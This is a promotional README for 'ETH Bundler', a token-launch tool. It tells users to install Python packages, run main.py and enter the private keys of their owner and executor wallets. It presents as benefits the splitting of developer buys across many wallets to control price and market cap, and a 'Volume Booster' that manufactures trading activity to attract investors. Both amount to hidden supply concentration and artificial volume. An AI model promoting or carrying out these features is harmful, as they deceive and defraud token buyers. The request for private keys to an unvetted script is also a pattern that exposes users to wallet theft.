# ⚡ ETH Bundler

**ETH Bundler** is a platform designed to help developers launch tokens securely and manage their markets, ensuring fairness and protecting against sniper bots. By leveraging token bundling, ETH Bundler empowers developers to control the initial supply, set the market cap, and drive early liquidity.

🔗 **Access ETH Bundler:** [eth-bundler.com](https://eth-bundler.com)

💬 **Join Our Community:** [Discord](https://discord.gg/solana-scripts)

---

## 🚀 Key Features

### 🛡️ Sniper Bot Protection
Sniper bots can destabilize token prices by buying up tokens early. ETH Bundler prevents this by sending multiple swap transactions in a single bundle. These bundled transactions are **atomic**, meaning they either succeed or fail together, blocking sniper bots from exploiting gaps between trades.

### 🏦 Jeets (Paper Hands) Management
Short-term holders, or "jeets," often weaken token prices by selling early. ETH Bundler counters this by offering **revenue-sharing** to holders of more than 1% of the total supply, encouraging long-term investment and stabilizing the market.

### 📊 Control Supply and Manage Price
ETH Bundler lets developers manage the token price by holding a significant portion of the supply. By distributing swaps across multiple wallets at launch, developers can control the market cap and guide the token's growth for a more stable and successful launch.

### 📈 Low Trading Volume Solution
ETH Bundler encourages early trading by **bundling tokens** and driving liquidity from day one. It also includes the powerful **Volume Booster** feature to generate higher trading activity and boost early engagement.

### 💹 Low Market Cap at Launch
Launching with a low market cap can deter investors. ETH Bundler solves this by managing wallets and bundling transactions, creating a stronger launch with a higher market cap, which attracts more investors.

### ⚡ Volume Booster
The **Volume Booster** feature is designed to supercharge token launches, ensuring high trading activity from the beginning. This helps attract more participants and creates excitement during launch.

---

## 🛠️ Wallet Setup & Requirements

To use ETH Bundler, your smart contract must include an `enableTrading` function (or similar). Here's what you need to get started:

- **Token Owner Wallet**: Used to deploy the smart contract.
- **Executor Wallet**: Distributes ETH to the recipient wallets and covers fees for ETH Bundler and the block builder.

> ⚠️ **Important:** Both wallets must be different, and each must have enough ETH to execute transactions and cover fees.

### 📝 How to Get Started
1. **Prepare Both Wallets**: Ensure the Token Owner and Executor wallets have sufficient ETH.
2. **Enter Private Keys**: During the process, you'll be prompted to enter the private keys for both wallets. This verifies ownership and checks the ETH balance.
3. **Generate Bundle Wallets**: Create multiple bundle wallets, each executing swaps independently. ETH Bundler does not support importing wallets.
4. **Secure Your Data**: Store wallet information, including private keys, securely. **It's your responsibility to protect this data.**

---

## 🖥️ Running the ETH Bundler Webview

Follow these steps to run the ETH Bundler webview interface:

1. **Install Dependencies**:
   ```bash
   pip install PyQt5 PyQtWebEngine web3 eth-account requests

2. Run the main script in your terminal:
   ```bash
   python main.py
3. You're ready to launch.

   You can also access it at eth-bundler.com

   For any extra support, join us at discord.gg/solana-scripts
